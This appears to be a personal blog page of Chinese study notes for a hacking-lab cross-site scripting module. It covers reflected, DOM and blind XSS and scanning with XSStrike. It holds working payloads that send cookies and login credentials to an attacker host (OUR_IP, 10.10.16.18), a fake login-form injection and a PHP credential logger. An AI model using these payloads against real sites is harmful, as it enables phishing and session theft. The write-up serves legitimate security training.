@@ -1,0 +1,485 @@
+
+<!DOCTYPE html>
+<html lang="en ">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Salve || XSS</title>
+    <meta name="author" content="TiAmo">
+    <meta name="description" content="Buona notte ">
+    <meta name="keywords" content=" ">
+    <link rel="icon" href="/avatar.png">
+    <link rel="stylesheet" href="/css/antd.min.css">
+    
+    <link rel="stylesheet" href="/css/full-theme.css">
+    
+    <script src="/js/vue.js"></script>
+    <script src="/js/antd.min.js"></script>
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+
+    <div id="loading"
+        style="height: 100vh; width: 100%; position: fixed;display: flex;z-index: 200; justify-content: space-between;">
+        <div id="loadleft" style="width: 50%;background-color: #ffffff;transition: width 0.6s ease-out;"></div>
+        <div id="loadright" style="width: 50%;background-color: #ffffff;transition: width 0.6s ease-out;"></div>
+        <div
+            style="position: fixed; height: 100vh; width: 100%;display: flex;justify-content: center;align-items: center;">
+            <div id="loadcontent"
+                style="width:400px;height:400px;padding:50px;border-radius:50%;display:flex;justify-content:center;align-items:center;border:solid 10px#a3ddfb; text-align:center;opacity:1;transition:opacity 0.3s ease-out;">
+                <div>
+                    <h2>LOADING...</h2>
+                    <p>加载过慢请开启缓存(浏览器默认开启)</p>
+                    <div>
+                        <img src="/dancingkitty.gif" alt="loading">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="layout">
+        <transition name="into">
+            <div v-show="show_page" style="display: none;">
+                <div id="menu_show">
+                     
+<nav id="menu">
+    <div class="desktop-menu">
+        <a href="/">
+            <span class="title">Salve</span>
+        </a>
+        
+        <a href="/">
+            <span>
+                <a-icon type="home" theme="filled" />
+            </span>
+            <span>home</span>
+        </a>
+        
+        <a href="/about">
+            <span>
+                <a-icon type="idcard" theme="filled" />
+            </span>
+            <span>about</span>
+        </a>
+        
+        <a href="/archives">
+            <span>
+                <a-icon type="folder" theme="filled" />
+            </span>
+            <span>archives</span>
+        </a>
+        
+        <a href="/categories">
+            <span>
+                <a-icon type="book" theme="filled" />
+            </span>
+            <span>categories</span>
+        </a>
+        
+        <a href="/tags">
+            <span>
+                <a-icon type="tags" theme="filled" />
+            </span>
+            <span>tags</span>
+        </a>
+        
+        <a href="">
+            <span>
+                <a-icon type="compass" theme="filled" />
+            </span>
+            <span>英文博客</span>
+        </a>
+        
+    </div>
+
+    <div :class="'phone-menu ' + menu_show" id="phone-menu">
+        <div :class="'title'" @click="menu_show=!menu_show">
+            <span style="margin-right: 10px;">
+                <a-icon type="appstore" theme="filled" />
+            </span>
+            <span>Salve</span>
+        </div>
+        <div class="items" v-show="menu_show">
+            
+            <a href="/">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="home" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">home</div>
+                </div>
+            </a>
+            
+            <a href="/about">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="idcard" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">about</div>
+                </div>
+            </a>
+            
+            <a href="/archives">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="folder" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">archives</div>
+                </div>
+            </a>
+            
+            <a href="/categories">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="book" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">categories</div>
+                </div>
+            </a>
+            
+            <a href="/tags">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="tags" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">tags</div>
+                </div>
+            </a>
+            
+            <a href="">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="compass" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">英文博客</div>
+                </div>
+            </a>
+            
+        </div>
+        <div class="curtain" v-show="menu_show"></div>
+    </div>
+
+</nav>
+                </div>
+
+                <div id="main">
+                     
+<link rel="stylesheet" href="/css/post-body.css">
+<div class="article">
+    <div>
+        <h1>XSS </h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <a-icon type="calendar" theme="filled" />
+            </span>
+            2023/8/15
+        </span>
+
+        
+
+        
+
+        <span class="tags">
+            <span class="icon">
+                <a-icon type="tags" theme="filled" />
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/base" style=color:#00bcd4>
+                    base
+                </a>
+            </span>
+            
+        </span>
+        
+    </div>
+
+    <div class="content" v-pre>
+        <h2 id="XSS-Testing-Payloads"><a href="#XSS-Testing-Payloads" class="headerlink" title="XSS Testing Payloads"></a>XSS Testing Payloads</h2><p>我们可以通过以下基本XSS负载来测试页面是否易受XSS攻击：</p>
+<pre><code class="html">&lt;script&gt;alert(window.origin)&lt;/script&gt;
+</code></pre>
+<span id="more"></span>
+
+<table>
+<thead>
+<tr>
+<th>Code</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>XSS Payloads</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>&lt;script&gt;alert(window.origin)&lt;/script&gt;</code></td>
+<td>Basic XSS Payload</td>
+</tr>
+<tr>
+<td><code>&lt;plaintext&gt;</code></td>
+<td>Basic XSS Payload</td>
+</tr>
+<tr>
+<td><code>&lt;script&gt;print()&lt;/script&gt;</code></td>
+<td>Basic XSS Payload</td>
+</tr>
+<tr>
+<td><code>&lt;img src=&quot;&quot; onerror=alert(window.origin)&gt;</code></td>
+<td>HTML-based XSS Payload</td>
+</tr>
+<tr>
+<td><code>&lt;script&gt;document.body.style.background = &quot;#141d2b&quot;&lt;/script&gt;</code></td>
+<td>Change Background Color</td>
+</tr>
+<tr>
+<td><code>&lt;script&gt;document.body.background = &quot;https://www.hackthebox.eu/images/logo-htb.svg&quot;&lt;/script&gt;</code></td>
+<td>Change Background Image</td>
+</tr>
+<tr>
+<td><code>&lt;script&gt;document.title = &#39;HackTheBox Academy&#39;&lt;/script&gt;</code></td>
+<td>Change Website Title</td>
+</tr>
+<tr>
+<td><code>&lt;script&gt;document.getElementsByTagName(&#39;body&#39;)[0].innerHTML = &#39;text&#39;&lt;/script&gt;</code></td>
+<td>Overwrite website’s main body</td>
+</tr>
+<tr>
+<td><code>&lt;script&gt;document.getElementById(&#39;urlform&#39;).remove();&lt;/script&gt;</code></td>
+<td>Remove certain HTML element</td>
+</tr>
+<tr>
+<td><code>&lt;script src=&quot;http://OUR_IP/script.js&quot;&gt;&lt;/script&gt;</code></td>
+<td>Load remote script</td>
+</tr>
+<tr>
+<td><code>&lt;script&gt;new Image().src=&#39;http://OUR_IP/index.php?c=&#39;+document.cookie&lt;/script&gt;</code></td>
+<td>Send Cookie details to us</td>
+</tr>
+<tr>
+<td><strong>Commands</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>python xsstrike.py -u &quot;http://SERVER_IP:PORT/index.php?task=test&quot;</code></td>
+<td>Run <code>xsstrike</code> on a url parameter</td>
+</tr>
+<tr>
+<td><code>sudo nc -lvnp 80</code></td>
+<td>Start <code>netcat</code> listener</td>
+</tr>
+<tr>
+<td><code>sudo php -S 0.0.0.0:80</code></td>
+<td>Start <code>PHP</code> server</td>
+</tr>
+</tbody></table>
+<blockquote>
+<p>提示：许多现代web应用程序使用跨域IFrame来处理用户输入，因此即使web表单易受XSS攻击，它也不会成为主web应用程序上的漏洞。这就是为什么我们在警告框中显示window.origin的值，而不是像1这样的静态值。在这种情况下，警报框会显示它正在执行的URL，并确认哪个表单是易受攻击的表单，以防使用IFrame。</p>
+</blockquote>
+<p>由于一些现代浏览器可能会在特定位置阻止<code>alert（）</code>JavaScript函数，因此了解一些其他基本的XSS有效载荷来验证XSS的存在可能会很方便。一个这样的XSS有效载荷是＜明文＞，它将停止呈现后面的HTML代码，并将其显示为明文。另一个容易发现的负载是<code>&lt;script&gt;print（）&lt;/script&gt;</code>，它将弹出浏览器打印对话框，任何浏览器都不太可能阻止它。试着使用这些有效载荷来看看每个有效载荷是如何工作的。</p>
+<h2 id="practice"><a href="#practice" class="headerlink" title="practice"></a>practice</h2><p>To get the flag, use the same payload we used above, but change its JavaScript code to show the cookie instead of showing the url.</p>
+<p><code>&lt;script&gt;alert(window.origin)&lt;/script&gt;</code></p>
+<p>输入测试注入后发现可以触发XSS漏洞：</p>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308151618784.png" alt="image-20230815161839658"></p>
+<p>然如注入</p>
+<p><code>&lt;script&gt;alert( document.cookie)&lt;/script&gt;</code></p>
+<p>从DOM读取cookie并反弹即可</p>
+<h1 id="Reflected-XSS"><a href="#Reflected-XSS" class="headerlink" title="Reflected XSS"></a>Reflected XSS</h1><p>有两种类型的非持久性XSS漏洞：反射XSS，由后端服务器处理；基于DOM的XSS，完全在客户端处理，永远不会到达后端服务器。与持久XSS不同，非持久XSS漏洞是暂时的，通过页面刷新不会持久存在。因此，我们的攻击只影响目标用户，不会影响访问该页面的其他用户。 当我们的输入到达后端服务器并在未经过滤或净化的情况下返回给我们时，就会出现反映的XSS漏洞。在许多情况下，我们的整个输入可能会返回给我们，比如错误消息或确认消息。在这些情况下，我们可能会尝试使用XSS有效载荷来查看它们是否执行。然而，由于这些通常是临时消息，一旦我们离开页面，它们就不会再次执行，因此它们是非持久性的。</p>
+<p>正如我们所看到的，单引号确实包含我们的XSS负载“＜script＞alert（window.origin）&lt;&#x2F;script＞”。 如果我们再次访问Reflected页面，错误消息将不再出现，并且我们的XSS负载也不会执行，这意味着这个XSS漏洞确实是非持久性的。 但是，如果XSS漏洞是非持久性的，我们将如何用它来瞄准受害者？ 这取决于使用哪个HTTP请求将我们的输入发送到服务器。我们可以通过Firefox开发工具点击[CTRL+I]并选择“网络”选项卡来检查这一点。然后，我们可以再次放入测试负载，并点击“添加”发送它</p>
+<p>正如我们所看到的，第一行显示我们的请求是一个GET请求。GET请求将它们的参数和数据作为URL的一部分发送。因此，为了针对用户，我们可以向他们发送一个包含我们的有效负载的URL。要获取URL，我们可以在发送XSS负载后从Firefox的URL栏中复制URL，也可以右键单击“网络”选项卡中的get请求，然后选择“复制”&gt;“复制URL”。一旦受害者访问此URL，XSS负载将执行</p>
+<h2 id="practice-1"><a href="#practice-1" class="headerlink" title="practice"></a>practice</h2><p>这里发送payload后在浏览器中找到了该请求，然后可以复制其url发送给其他用户触发XSS，curl也是可以的：</p>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308151635364.png" alt="image-20230815163500315"></p>
+<h1 id="DOM-XSS"><a href="#DOM-XSS" class="headerlink" title="DOM XSS"></a>DOM XSS</h1><pre><code class="javascript">document.getElementById(&quot;todo&quot;).innerHTML = &quot;&lt;b&gt;Next Task:&lt;/b&gt; &quot; + decodeURIComponent(task);
+</code></pre>
+<p>我们可以看到，我们可以控制输入，而输出没有被净化，所以这个页面应该容易受到DOM XSS的攻击。</p>
+<h2 id="DOM-Attacks"><a href="#DOM-Attacks" class="headerlink" title="DOM Attacks"></a>DOM Attacks</h2><p>如果我们尝试以前使用过的XSS负载，我们会发现它不会执行。这是因为innerHTML函数不允许将其中的＜script＞标记用作安全功能。尽管如此，我们使用的许多其他XSS有效载荷都不包含＜script＞标签，比如下面的XSS有效负载：</p>
+<pre><code class="html">&lt;img src=&quot;&quot; onerror=alert(window.origin)&gt;
+</code></pre>
+<h1 id="XSS-Discovery"><a href="#XSS-Discovery" class="headerlink" title="XSS Discovery"></a>XSS Discovery</h1><h2 id="Automated-Discovery"><a href="#Automated-Discovery" class="headerlink" title="Automated Discovery"></a>Automated Discovery</h2><p>几乎所有的Web应用程序漏洞扫描程序（如Nessus、Burp Pro或ZAP）都具有检测所有三种类型的XSS漏洞的各种功能。这些扫描仪通常进行两种类型的扫描：被动扫描，用于检查客户端代码中是否存在潜在的基于DOM的漏洞；主动扫描，用于发送各种类型的有效载荷，试图通过在页面源中注入有效载荷来触发XSS。</p>
+<p>虽然付费工具在检测XSS漏洞方面通常具有更高的准确性（尤其是在需要安全绕过的情况下），但我们仍然可以找到开源工具来帮助我们识别潜在的XSS漏洞。这些工具通常通过识别网页中的输入字段，发送各种类型的XSS有效载荷，然后比较渲染的页面源，看看是否可以在其中找到相同的有效载荷，这可能表明XSS注入成功。尽管如此，这并不总是准确的，因为有时，即使注入了相同的有效载荷，由于各种原因，也可能无法成功执行，因此我们必须始终手动验证XSS注入。</p>
+<p>可以帮助我们发现XSS的一些常见开源工具是<a target="_blank" rel="noopener" href="https://github.com/s0md3v/XSStrike">XSS Strike</a>、<a target="_blank" rel="noopener" href="https://github.com/rajeshmajumdar/BruteXSS">Brute XSS</a>和 <a target="_blank" rel="noopener" href="https://github.com/epsylon/xsser">XSSer</a>。我们可以通过gitclone将XSS Strike克隆到我们的VM来尝试：</p>
+<pre><code class="shell-session">Tanin@htb[/htb]$ git clone https://github.com/s0md3v/XSStrike.git
+Tanin@htb[/htb]$ cd XSStrike
+Tanin@htb[/htb]$ pip install -r requirements.txt
+Tanin@htb[/htb]$ python xsstrike.py
+</code></pre>
+<pre><code class="shell-session">Tanin@htb[/htb]$ python xsstrike.py -u &quot;http://SERVER_IP:PORT/index.php?task=test&quot; 
+
+        XSStrike v3.1.4
+
+[~] Checking for DOM vulnerabilities 
+[+] WAF Status: Offline 
+[!] Testing parameter: task 
+[!] Reflections found: 1 
+[~] Analysing reflections 
+[~] Generating payloads 
+[!] Payloads generated: 3072 
+------------------------------------------------------------
+[+] Payload: &lt;HtMl%09onPoIntERENTER+=+confirm()&gt; 
+[!] Efficiency: 100 
+[!] Confidence: 10 
+[?] Would you like to continue scanning? [y/N]
+</code></pre>
+<h2 id="Manual-Discovery"><a href="#Manual-Discovery" class="headerlink" title="Manual Discovery"></a>Manual Discovery</h2><p>当涉及到手动XSS发现时，发现XSS漏洞的难度取决于web应用程序的安全级别。基本XSS漏洞通常可以通过测试各种XSS有效载荷来发现，但识别高级XSS漏洞需要高级代码审查技能。</p>
+<h4 id="XSS-Payloads"><a href="#XSS-Payloads" class="headerlink" title="XSS Payloads"></a>XSS Payloads</h4><p>查找XSS漏洞的最基本方法是针对给定网页中的输入字段手动测试各种XSS有效载荷。我们可以在网上找到XSS有效载荷的巨大列表，比如 [PayloadAllTheThings](<a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS</a> Injection&#x2F;README.md)上的或<a target="_blank" rel="noopener" href="https://github.com/payloadbox/xss-payload-list">PayloadBox</a>中的。然后，我们可以开始逐一测试这些有效载荷，方法是复制每个有效载荷并将其添加到我们的表单中，然后查看是否弹出警报框。</p>
+<h2 id="practice-2"><a href="#practice-2" class="headerlink" title="practice"></a>practice</h2><p> Utilize some of the techniques mentioned in this section to identify the vulnerable input parameter found in the above server. What is the name of the vulnerable parameter?</p>
+<p> What type of XSS was found on the above server? “name only”</p>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308151738961.png" alt="image-20230815173856882"></p>
+<p>我们使用工具进行扫描后发现email是可以注入xss的，然后把email参数用之前的测试代码测试了一下，发现确实可以：</p>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308151740417.png" alt="image-20230815174014373"></p>
+<h1 id="Phishing"><a href="#Phishing" class="headerlink" title="Phishing"></a>Phishing</h1><p>另一种非常常见的XSS攻击是网络钓鱼攻击。网络钓鱼攻击通常利用看起来合法的信息诱骗受害者将其敏感信息发送给攻击者。XSS网络钓鱼攻击的一种常见形式是通过注入伪造的登录表单，将登录详细信息发送到攻击者的服务器，然后攻击者可以使用该服务器代表受害者登录并控制其帐户和敏感信息。 </p>
+<h2 id="practice-3"><a href="#practice-3" class="headerlink" title="practice"></a>practice</h2><p> 尝试为在上述服务器中的“&#x2F;philishing”中找到的图像URL表单找到一个有效的XSS负载，然后使用您在本节中学到的内容准备一个注入恶意登录表单的恶意URL。然后访问“&#x2F;philish&#x2F;send.php”将URL发送给受害者，他们将登录到恶意登录表单。如果您做得正确，您应该收到受害者的登录凭据，您可以使用该凭据登录到“&#x2F;philishing&#x2F;login.php”并获取标志。</p>
+<p>我们来到钓鱼网站，确认网站可以注入后，尝试注入一个简单的钓鱼表单：</p>
+<pre><code class="html">&lt;div&gt;
+&lt;h3&gt;Please login to continue&lt;/h3&gt;
+&lt;input type=&quot;text&quot; placeholder=&quot;Username&quot;&gt;
+&lt;input type=&quot;text&quot; placeholder=&quot;Password&quot;&gt;
+&lt;input type=&quot;submit&quot; value=&quot;Login&quot;&gt;
+&lt;br&gt;&lt;br&gt;
+&lt;/div&gt;
+</code></pre>
+<p>注入代码：</p>
+<pre><code class="javascript">document.write(&#39;&lt;h3&gt;Please login to continue&lt;/h3&gt;&lt;form action=http://OUR_IP&gt;&lt;input type=&quot;username&quot; name=&quot;username&quot; placeholder=&quot;Username&quot;&gt;&lt;input type=&quot;password&quot; name=&quot;password&quot; placeholder=&quot;Password&quot;&gt;&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Login&quot;&gt;&lt;/form&gt;&#39;);
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308151835805.png" alt="image-20230815183544764"></p>
+<p>在用户‘登录’之前，我们不应该让原页面出现在页面上，这违背了我们的“请登录以继续”这句话。因此，为了鼓励受害者使用登录表单，我们应该删除URL字段，这样他们可能会认为必须登录才能使用该页面。为此，我们可以使用JavaScript函数document.getElementById（）.remove（）函数。 要找到要删除的HTML元素的id，我们可以通过单击[CTRL+SHIFT+C]打开页面检查器选取器，然后单击我们需要的元素可以得到该表单的id，然后将其移除：</p>
+<pre><code class="javascript">document.getElementById(&#39;urlform&#39;).remove();
+</code></pre>
+<p>我们发现还有一个原始的html代码在我们注入的表单之后，再插入一个注释将其删除：</p>
+<pre><code class="html">...PAYLOAD... &lt;!-- 
+</code></pre>
+<p>完整的payload为：</p>
+<pre><code>&#39;&gt;&lt;script&gt;document.write(&#39;&lt;h3&gt;Please login to continue&lt;/h3&gt;&lt;form action=http://10.10.16.18&gt;&lt;input type=&quot;username&quot; name=&quot;username&quot; placeholder=&quot;Username&quot;&gt;&lt;input type=&quot;password&quot; name=&quot;password&quot; placeholder=&quot;Password&quot;&gt;&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Login&quot;&gt;&lt;/form&gt;&#39;);document.getElementById(&#39;urlform&#39;).remove();&lt;/script&gt;&lt;!--
+</code></pre>
+<p>这里的开头要闭合一下前面的标签</p>
+<p>最后我们得到了一下页面：</p>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308151901586.png" alt="image-20230815190115549"></p>
+<p>此时我们用nc监听我们的80端口，然后用test：test”登录”网页：</p>
+<p> <img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308151905792.png" alt="image-20230815190550748"></p>
+<p>我们盗取到了用户的凭证，然而，由于我们只使用netcat侦听器进行侦听，它将无法正确处理HTTP请求，受害者将收到“无法连接”错误，这可能会引起一些怀疑。因此，我们可以使用一个基本的PHP脚本来记录HTTP请求中的凭据，然后在不进行任何注入的情况下将受害者返回到原始页面。在这种情况下，受害者可能认为他们成功登录，并将按预期使用图像查看器。</p>
+<pre><code class="php">&lt;?php
+if (isset($_GET[&#39;username&#39;]) &amp;&amp; isset($_GET[&#39;password&#39;])) &#123;
+    $file = fopen(&quot;creds.txt&quot;, &quot;a+&quot;);
+    fputs($file, &quot;Username: &#123;$_GET[&#39;username&#39;]&#125; | Password: &#123;$_GET[&#39;password&#39;]&#125;\n&quot;);
+    header(&quot;Location: http://SERVER_IP/phishing/index.php&quot;);
+    fclose($file);
+    exit();
+&#125;
+?&gt;
+</code></pre>
+<p>这里要把第五行的重定向地址更改为目标地址。<code>Location</code> 是一个 HTTP 响应头，用于指示浏览器重定向到另一个页面。当服务器返回带有 <code>Location</code> 头的响应时，浏览器会根据该头信息将用户自动重定向到指定的 URL。</p>
+<p>写好文件后搭建一个php服务器：</p>
+<p><code>sudo php -S 0.0.0.0:80</code></p>
+<p>具体而言：</p>
+<ul>
+<li><code>sudo</code>: 使用超级用户权限执行命令，可能需要管理员密码验证。</li>
+<li><code>php</code>: 启动 PHP 解释器。</li>
+<li><code>-S</code>: 启动 PHP 内置的 Web 服务器。</li>
+<li><code>0.0.0.0:80</code>: 指定服务器监听的 IP 地址为 0.0.0.0，这表示允许所有可用的网络接口访问。端口为 80，这是默认的 HTTP 端口。</li>
+</ul>
+<p>此时网页就会自动重定向到原网页了：</p>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308151919924.png" alt="image-20230815191923844"></p>
+<h1 id="Session-Hijacking"><a href="#Session-Hijacking" class="headerlink" title="Session Hijacking"></a>Session Hijacking</h1><h2 id="Blind-XSS-Detection"><a href="#Blind-XSS-Detection" class="headerlink" title="Blind XSS Detection"></a>Blind XSS Detection</h2><p>盲XSS漏洞通常发生在只有特定用户（例如Admins）才能访问的表单中。一些潜在的例子包括： 联系人表格 评论 用户详细信息 支持票证 HTTP用户代理标头</p>
+<p>我们将看不到我们的输入将如何处理，也看不到它在浏览器中的外观，因为它只会在我们无法访问的某个管理面板中显示给管理员。在正常情况下（即非盲），我们可以测试每个字段，直到我们得到一个警告框，就像我们在整个模块中所做的那样。然而，在这种情况下，由于我们无法访问Admin面板，如果我们看不到如何处理输出，我们如何检测XSS漏洞？</p>
+<p>为此，我们可以使用上一节中使用的相同技巧，即使用JavaScript负载将HTTP请求发送回服务器。如果JavaScript代码被执行，我们将在机器上得到响应，我们就会知道页面确实存在漏洞。 然而，这引入了两个问题： 我们如何才能知道哪个特定领域是脆弱的？由于任何一个字段都可能执行我们的代码，所以我们不知道它们中的哪一个执行了。 我们如何知道要使用什么XSS有效载荷？既然页面可能有漏洞，但有效负载可能不起作用？</p>
+<h2 id="Loading-a-Remote-Script"><a href="#Loading-a-Remote-Script" class="headerlink" title="Loading a Remote Script"></a>Loading a Remote Script</h2><p>在HTML中，我们可以在＜script＞标记中编写JavaScript代码，但我们也可以通过提供其URL来包含远程脚本，如下所示：</p>
+<pre><code class="html">&lt;script src=&quot;http://OUR_IP/script.js&quot;&gt;&lt;/script&gt;
+</code></pre>
+<p>因此，我们可以使用它来执行虚拟机上提供的远程JavaScript文件。我们可以将请求的脚本名称从script.js更改为我们正在注入的字段的名称，这样，当我们在VM中获得请求时，我们可以识别执行脚本的易受攻击的输入字段</p>
+
+    </div>
+
+    
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+    <div id="comment">
+        <div id="gitalk-container">
+        </div>
+    </div>
+    
+</div>
+                     
+<footer id="footer">
+    <div class="footer-wrap">
+        <div>
+            © 2018 - 2023 Salve
+            <span class="footer-icon">
+                <a-icon type="flag" theme="filled" /></span>
+            @TiAmo
+        </div>
+        <div></div>
+        <div>Based on the <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo Engine</a> & <a
+                target="_blank" rel="noopener" href="https://github.com/korilin/hexo-theme-particle">Particle Theme</a></div>
+        
+    </div>
+
+</footer>
+
+<script src="/js/highlight.min.js"></script>
+<script src="/js/particle.js"></script>
+                </div>
+            </div>
+        </transition>
+    </div>
+
+    <script>
+    new Vue({
+        el: "#layout",
+        data: {
+            show_page: false,
+            onload_menu: false,
+            menu_show: false,
+            card_top: 100
+        },
+        created: function () {
+            var that = this
+            window.onload = function () {
+                that.show_page = true
+                document.getElementById("loadcontent").style.opacity = 0
+                setTimeout(function () {
+                    document.getElementById("loadleft").style.width = 0
+                    document.getElementById("loadright").style.width = 0
+                }, 300)
+                setTimeout(function () {
+                    document.getElementById("loading").style = "display:none"
+                }, 600)
+            }
+        },
+        mounted: function () {
+            var that = this
+            window.addEventListener('scroll', function (e) {
+                that.menu_show = false
+            })
+        },
+        methods: {
+            home_click: function () {
+                window.scrollTo({
+                    top: window.innerHeight - 80,
+                    behavior: "smooth",
+                });
+            }
+        }
+    })
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<script>
+    const gitalk = new Gitalk({
+        clientID: '',
+        clientSecret: '',
+        repo: 'hexo-theme-particle',      // The repository of store comments,
+        owner: 'korilin',
+        admin: ['korilin'],
+        language: 'en',
+        id: location.pathname,      // Ensure uniqueness and length less than 50
+        distractionFreeMode: true  // Facebook-like distraction free mode
+    })
+    gitalk.render('gitalk-container')
+</script>
+
+</body>
+
+</html>
